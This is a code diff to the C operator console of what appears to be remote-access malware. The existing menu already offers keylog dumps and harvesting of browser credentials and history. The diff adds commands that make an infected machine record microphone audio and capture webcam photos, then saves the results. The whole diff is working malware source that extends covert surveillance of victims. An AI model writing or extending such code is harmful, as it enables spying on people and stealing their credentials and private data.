@@ -259,6 +259,8 @@ static void display_prompt(int persistence)
     printf(" 12 - KEYLOG_DUMP                Dump keylog\n");
     printf(" 13 - CRED_STEAL                 Harvest browser credentials\n");
     printf(" 14 - HISTORY_STEAL              Harvest browser history\n");
+    printf(" 15 - MIC_RECORD                 Record microphone audio\n");
+    printf(" 16 - CAMERA_SNAPSHOT            Capture webcam photo\n");
     printf("> ");
     fflush(stdout);
 }
@@ -276,9 +278,9 @@ static int console_input(int persistence)
         if (strchr(input_buffer, '\n') == NULL)
             flush_stdin();
         if (sscanf(input_buffer, "%d", &choice) == 1 &&
-            choice >= 0 && choice <= 14)
+            choice >= 0 && choice <= 16)
             break;
-        printf("INVALID INPUT! Please enter an integer from 0-14.\n");
+        printf("INVALID INPUT! Please enter an integer from 0-16.\n");
     }
     return choice;
 }
@@ -436,11 +438,13 @@ static void run_command_loop(int slot)
             Packet pkt = {COMMAND_SCREENSHOT, s->request_id, 0, NULL};
             send_packet(&pkt, conn);
             Packet *resp = recieve_packet(conn);
-            if (resp && resp->command_type == COMMAND_RESPONSE)
+            if (resp && resp->command_type == COMMAND_RESPONSE) {
                 handle_screenshot_response(resp, save_dir);
-            else if (process_response(resp, s->request_id, conn) == -1)
-                connected = 0;
-            if (resp) free_packet(resp);
+                free_packet(resp);
+            } else {
+                if (process_response(resp, s->request_id, conn) == -1)
+                    connected = 0;
+            }
             break;
         }
 
@@ -479,11 +483,13 @@ static void run_command_loop(int slot)
             Packet pkt = {COMMAND_KEYLOG_DUMP, s->request_id, 0, NULL};
             send_packet(&pkt, conn);
             Packet *resp = recieve_packet(conn);
-            if (resp && resp->command_type == COMMAND_RESPONSE)
+            if (resp && resp->command_type == COMMAND_RESPONSE) {
                 handle_keylog_dump_response(resp, save_dir);
-            else if (process_response(resp, s->request_id, conn) == -1)
-                connected = 0;
-            if (resp) free_packet(resp);
+                free_packet(resp);
+            } else {
+                if (process_response(resp, s->request_id, conn) == -1)
+                    connected = 0;
+            }
             break;
         }
 
@@ -494,11 +500,13 @@ static void run_command_loop(int slot)
             Packet pkt = {COMMAND_CRED_STEAL, s->request_id, 0, NULL};
             send_packet(&pkt, conn);
             Packet *resp = recieve_packet(conn);
-            if (resp && resp->command_type == COMMAND_RESPONSE)
+            if (resp && resp->command_type == COMMAND_RESPONSE) {
                 handle_cred_steal_response(resp, save_dir);
-            else if (process_response(resp, s->request_id, conn) == -1)
-                connected = 0;
-            if (resp) free_packet(resp);
+                free_packet(resp);
+            } else {
+                if (process_response(resp, s->request_id, conn) == -1)
+                    connected = 0;
+            }
             break;
         }
 
@@ -509,11 +517,50 @@ static void run_command_loop(int slot)
             Packet pkt = {COMMAND_HISTORY_STEAL, s->request_id, 0, NULL};
             send_packet(&pkt, conn);
             Packet *resp = recieve_packet(conn);
-            if (resp && resp->command_type == COMMAND_RESPONSE)
+            if (resp && resp->command_type == COMMAND_RESPONSE) {
                 handle_history_steal_response(resp, save_dir);
-            else if (process_response(resp, s->request_id, conn) == -1)
-                connected = 0;
-            if (resp) free_packet(resp);
+                free_packet(resp);
+            } else {
+                if (process_response(resp, s->request_id, conn) == -1)
+                    connected = 0;
+            }
+            break;
+        }
+
+        case 15: { /* MIC_RECORD */
+            char *dur_str = parameters_input("Enter recording duration in seconds: ");
+            printf("<Recording microphone audio for %s second(s)...>\n\n", dur_str);
+            fflush(stdout);
+            s->request_id++;
+            Packet pkt = {COMMAND_MIC_RECORD, s->request_id,
+                          (int)strlen(dur_str), dur_str};
+            send_packet(&pkt, conn);
+            free(dur_str);
+            Packet *resp = recieve_packet(conn);
+            if (resp && resp->command_type == COMMAND_RESPONSE) {
+                handle_mic_record_response(resp, save_dir);
+                free_packet(resp);
+            } else {
+                if (process_response(resp, s->request_id, conn) == -1)
+                    connected = 0;
+            }
+            break;
+        }
+
+        case 16: { /* CAMERA_SNAPSHOT */
+            printf("<Capturing webcam snapshot...>\n\n");
+            fflush(stdout);
+            s->request_id++;
+            Packet pkt = {COMMAND_CAMERA_SNAPSHOT, s->request_id, 0, NULL};
+            send_packet(&pkt, conn);
+            Packet *resp = recieve_packet(conn);
+            if (resp && resp->command_type == COMMAND_RESPONSE) {
+                handle_camera_snapshot_response(resp, save_dir);
+                free_packet(resp);
+            } else {
+                if (process_response(resp, s->request_id, conn) == -1)
+                    connected = 0;
+            }
             break;
         }
 
